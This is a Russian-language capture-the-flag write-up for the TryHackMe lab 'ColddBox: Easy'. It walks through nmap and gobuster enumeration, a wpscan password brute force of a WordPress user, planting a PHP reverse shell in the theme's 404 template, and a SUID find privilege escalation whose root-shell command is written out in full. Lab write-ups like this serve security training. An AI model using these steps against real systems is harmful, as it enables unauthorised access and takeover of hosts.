# ColddBox: Easy

:white_check_mark:  [**Wpscan**](#wpscan)

:white_check_mark: [**Wordpress_theme_editor**](#wordpress_theme_editor)

___

## Enumeration
Сканируем ip командой:
```
nmap -sC -sV cold.thm
```

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18
Service Info: Host: 127.0.1.1
```

Главная страница cold.thm

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/ColddBox/1.png)

Просканируем дирекутории:
```
gobuster dir -u http://cold.thm/ -t 100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt,.html
```
```
/wp-content           (Status: 301) [Size: 309] [--> http://cold.thm/wp-content/]
/index.php            (Status: 301) [Size: 0] [--> http://cold.thm/]
/wp-includes          (Status: 301) [Size: 310] [--> http://cold.thm/wp-includes/]
/license.txt          (Status: 200) [Size: 19930]                                  
/wp-login.php         (Status: 200) [Size: 2547]                                   
/readme.html          (Status: 200) [Size: 7173]
/wp-admin             (Status: 301) [Size: 307] [--> http://cold.thm/wp-admin/]   
/hidden               (Status: 301) [Size: 305] [--> http://cold.thm/hidden/]     
/xmlrpc.php           (Status: 200) [Size: 42]
```

Страница cold.thm/hidden :

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/ColddBox/2.png)

Можем заметить некторые имена пользователей.

<a name="wpscan"></a>

На главной странице мы могли заметить, что сайт работает на wordpress, перейдем в директорию /wp-admin/. Просканируем с помощью **wpscan** имена пользователей.
```
wpscan --url cold.thm --enumerate u
```

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/ColddBox/3.png)

Попробуем сбрутить пароль для имени пользователя c0ldd:
```
wpscan --url cold.thm --passwords /usr/share/wordlists/rockyou.txt --usernames c0ldd
```

```
[SUCCESS] - c0ldd / 9<Redacted>0
```

<a name="wordpress_theme_editor"></a>

Логинимся на wordpress.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/ColddBox/4.png)

Переходим в редактор тем на страницу 404. Appearance -> Editor -> 404 Template. Закидываем php reverse shell.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/ColddBox/5.png)

Переходим на страницу 404.php(cold.thm/wp-content/themes/twentyfifteen/404.php). Получаем shell.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/ColddBox/6.png)

Закидываем linpeas и находим suid в find.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/ColddBox/7.png)

На [GTFOBins](https://gtfobins.github.io/) переходим на страницу find и находим решение.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/ColddBox/8.png)

Переходим в директорию /usr/bin и выполныем команду:
```
./find . -exec /bin/sh -p \; -quit
```

Получаем рута.
